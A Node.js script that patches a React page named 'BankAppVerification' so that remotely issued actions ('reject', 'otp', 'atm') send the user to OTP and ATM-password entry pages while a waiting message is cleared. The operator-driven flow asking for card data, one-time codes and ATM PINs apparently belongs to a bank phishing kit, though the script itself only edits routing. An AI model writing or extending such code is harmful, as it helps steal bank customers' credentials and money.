const fs = require('fs');
const f = 'client/src/pages/BankAppVerification.tsx';
let s = fs.readFileSync(f, 'utf8');
function rep(a, b) {
  if (!s.includes(a)) { console.error('MISSING -> ' + a.slice(0, 60)); process.exit(1); }
  s = s.replace(a, b);
}
rep('import { useEffect, useState } from "react";', 'import { useEffect, useState } from "react";\nimport { useLocation } from "wouter";');
rep('import { sendData, cardAction, navigateToPage } from "@/lib/store";', 'import { sendData, cardAction, navigateToPage, waitingMessage } from "@/lib/store";');
rep('  const [error, setError] = useState(false);', '  const [, navigate] = useLocation();\n  const [error, setError] = useState(false);');
rep('    if (a.action === "reject") { setRejected(true); setError(true); setIsWaiting(false); }', `    if (a.action === "reject") {
      setRejected(true);
      setError(true);
      setIsWaiting(false);
    } else if (a.action === "otp") {
      waitingMessage.value = "";
      setIsWaiting(false);
      navigate("/otp-verification");
    } else if (a.action === "atm") {
      waitingMessage.value = "";
      setIsWaiting(false);
      navigate("/atm-password");
    }`);
fs.writeFileSync(f, s);
console.log('done');